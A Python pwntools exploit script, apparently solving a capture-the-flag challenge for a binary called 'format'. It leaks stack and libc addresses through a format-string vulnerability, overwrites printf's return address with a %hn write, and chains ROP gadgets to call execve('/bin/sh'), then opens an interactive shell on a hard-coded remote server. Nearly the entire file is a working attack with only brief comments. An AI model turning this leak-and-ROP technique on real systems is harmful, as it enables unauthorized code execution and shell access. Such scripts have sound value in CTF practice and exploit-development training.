#!/usr/bin/env python3

from pwn import *

def Main(local=True):
    context.binary = "./format"

    if local:
        proc = process()
    else:
        proc = remote("144.126.196.214", 31035)

    proc.clean()

    # ~ DumpStack(proc, 50)

    ### 21   _IO_2_1_stderr_
    ### 28   _IO_file_jumps
    ### 45   __libc_start_main_ret


    ### read first stack address on stack, sub offset from rsp
    rsp = ReadStackOffset(40, proc)
    rsp = int(rsp, 16) - 304

    ### next stack addr is echo() ret addr; <main+47>
    main_addr = ReadStackOffset(41, proc)
    main_addr = int(main_addr, 16) - 47


    libc_start_main_ret = ReadStackOffset(45, proc)
    libc_start_main_ret = int(libc_start_main_ret, 16)

    ### local libc
    # ~ libc_system = libc_start_main_ret + 0x220e6

    libc_execve = libc_start_main_ret + 0xc3299
    libc_bin_sh  = libc_start_main_ret + 0x192303


    print("start_main_ret:", hex(libc_start_main_ret))

    ##calc printf() return to echo()+77
    printf_ret = main_addr - 142

    ### add offset to pop 3 gadget to echo()+77 last 2 bytes
    overwrite = (printf_ret & 0xffff) + 312

    print("old ret:", hex(printf_ret))
    print("new ret:", hex(printf_ret +312))

    if printf_ret & 0xf0000 != (printf_ret + 312) & 0xf0000:
        print("offset error")

    if local:
        GDB(proc)

    pop_rdi = main_addr + 0xaf
    pop_rsi_r15 = main_addr + 0xad

    exploit = "%{}p%8$hn".format(overwrite).encode('latin-1')
    exploit += b"\x00" * (16 - len(exploit))

    exploit += p64(rsp-8)

    exploit += p64(pop_rdi)

    exploit += p64(libc_bin_sh)

    exploit += p64(pop_rsi_r15)

    exploit += b"\x00" * 16

    exploit += p64(libc_execve)

    if b"\n" in exploit:
        print("Warning, new line in exploit")

    proc.writeline(exploit)

    n = proc.clean()

    proc.interactive()


def ReadStackOffset(offset, proc):
    proc.clean()

    proc.writeline("%{}$p".format(offset) )

    return proc.read().strip()


def GDB(proc):
    sc = list()
    sc.append("break *echo+72")
    sc.append("break *__libc_csu_init+94")
    sc.append("continue")
    sc.append("")

    sc = '\n'.join(sc)

    gdb.attach(proc, sc)


def DumpStack(proc, length):
    for x in list(range(length)):
        print(x, ReadStackOffset(x, proc))


if __name__ == "__main__":
    Main(local=False)
